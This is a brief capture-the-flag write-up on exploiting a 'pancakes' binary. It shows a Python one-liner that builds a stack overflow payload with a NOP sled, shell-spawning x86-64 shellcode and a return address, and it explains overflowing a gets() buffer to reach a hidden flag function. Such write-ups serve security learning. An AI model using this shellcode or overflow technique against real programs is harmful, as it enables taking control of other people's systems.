teha@kali:~/Downloads$ python -c 'print "\x90" * (152 - 27) + "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" + "\x10\xa0\xff\xff"' > input
teha@kali:~/Downloads$ ./pancakes < input

Getting the program to seg-fault, but I can't get it to return properly. In GDB it says it can't use the address

Since I had to leave the competition early due to some personal conflicts, I came back to analyze this after the fact.

When I put the binary into ghidra, I found that there is a secret function that would open the flag ad the address (0x40098b) To exploit from here, we can see the main function uses gets() so we can exploit that to run our function. The buffer has 128 characters, so we need to fill the buffer, plus a little extra in order to load our new address. 152 bytes would do the trick in order for us to finish the exploit. 